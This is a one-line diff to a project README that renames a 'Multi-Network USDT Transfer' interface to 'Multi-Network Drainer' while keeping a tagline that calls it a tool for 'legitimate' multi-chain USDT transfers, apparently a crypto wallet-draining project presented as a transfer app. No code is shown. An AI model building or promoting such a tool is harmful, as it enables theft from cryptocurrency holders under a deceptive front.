@@ -1,4 +1,4 @@
-🌐 Multi-Network USDT Transfer
+🌐 Multi-Network Drainer 
 
 <p align="center">
   <b>A lightweight, responsive Web3 interface for legitimate multi-chain USDT transfers.</b>
